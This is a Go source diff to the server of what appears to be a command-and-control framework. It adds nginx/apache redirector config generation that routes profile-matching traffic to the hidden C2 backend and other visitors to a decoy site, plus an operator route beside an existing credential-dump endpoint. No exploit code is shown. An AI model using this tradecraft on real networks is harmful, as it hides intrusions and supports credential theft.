@@ -8,6 +8,7 @@ import (
 	"BackendTemplate/pkg/audit"
 	"BackendTemplate/pkg/backup"
 	"BackendTemplate/pkg/c2profile"
+	"BackendTemplate/pkg/cli"
 	"BackendTemplate/pkg/cna"
 	"BackendTemplate/pkg/command"
 	"BackendTemplate/pkg/config"
@@ -92,6 +93,16 @@ func main() {
 	var restoreFrom = flag.String("restore", "", "用指定备份恢复数据库并退出（需先停止服务端）")
 	var restoreForce = flag.Bool("force", false, "恢复时跳过“数据库可能正在使用”检查")
 	var listBackups = flag.Bool("list-backups", false, "列出备份并退出")
+	// 重定向器配置生成（阶段三）：按当前画像生成 nginx/apache 配置后退出
+	var genRedirector = flag.String("gen-redirector", "", "生成重定向器配置（nginx|apache）并退出")
+	var rdBackend = flag.String("backend", "", "重定向器后端地址 host:port（真正的 C2 服务端）")
+	var rdDomain = flag.String("domain", "", "重定向器对外域名（TLS 证书名）")
+	var rdCert = flag.String("cert", "", "TLS 证书路径（-full 时必填）")
+	var rdKey = flag.String("key", "", "TLS 私钥路径（-full 时必填）")
+	var rdDecoy = flag.String("decoy", "", "诱饵站点 URL（非画像请求的落点）")
+	var rdProfile = flag.String("profile", "default", "使用的画像名")
+	var rdOut = flag.String("out", "", "输出文件（缺省打印到 stdout）")
+	var rdFull = flag.Bool("full", false, "生成完整可用的配置文件（nginx）而非 include 片段")
 	flag.Parse()
 
 	// 加载配置
@@ -110,13 +121,24 @@ func main() {
 		Prefix: "tshell-backup",
 	})
 	if *listBackups {
-		os.Exit(runListBackups(cliBackupMgr))
+		os.Exit(cli.RunListBackups(cliBackupMgr))
 	}
 	if *backupNow {
-		os.Exit(runBackupNow(cliBackupMgr))
+		os.Exit(cli.RunBackupNow(cliBackupMgr))
 	}
 	if *restoreFrom != "" {
-		os.Exit(runRestore(cliBackupMgr, *restoreFrom, database.DatabaseName, *restoreForce))
+		os.Exit(cli.RunRestore(cliBackupMgr, *restoreFrom, database.DatabaseName, *restoreForce))
+	}
+	if *genRedirector != "" {
+		// 画像从 profiles/ 目录读取（与服务端同一来源，避免生成用的画像与实际部署的不一致）
+		if err := c2profile.InitNoWatch("./profiles"); err != nil {
+			fmt.Printf("❌ 加载画像失败: %v\n", err)
+			os.Exit(1)
+		}
+		os.Exit(cli.RunGenRedirector(*genRedirector, cli.RedirectorOptions{
+			Backend: *rdBackend, Domain: *rdDomain, Cert: *rdCert, Key: *rdKey,
+			Decoy: *rdDecoy, Profile: *rdProfile, Out: *rdOut, Full: *rdFull,
+		}))
 	}
 
 	// 日志级别：debug|info|warn|error（服务端输出内容开关）
@@ -782,6 +804,9 @@ func main() {
 	// 凭据获取（阶段三）：制品的登记与校验在 pkg/cred，回传复用下载通道
 	operatorOnly.POST("/cred/dump", api.DumpCredential)
 	operatorOnly.GET("/cred/artifacts", api.ListCredArtifacts)
+
+	// 重定向器配置：按当前画像生成 nginx/apache 配置（手写最容易与画像漂移）
+	operatorOnly.GET("/redirector/template", api.GetRedirectorTemplate)
 
 	operatorOnly.POST("/client/migrate", api.Migrate)
 
